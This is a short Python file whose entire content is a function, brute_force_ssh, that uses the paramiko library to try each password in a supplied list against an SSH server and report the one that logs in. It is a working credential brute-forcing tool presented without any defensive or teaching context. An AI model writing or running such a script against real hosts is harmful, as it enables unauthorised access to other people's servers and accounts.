import paramiko
import time

def brute_force_ssh(ip, username, password_list):
    """Attempt to brute force SSH login."""
    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=password, timeout=3)
            print(f"Success! Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print(f"Failed with password: {password}")
        except Exception as e:
            print(f"Error: {e}")
    print("No valid password found.")
    return None
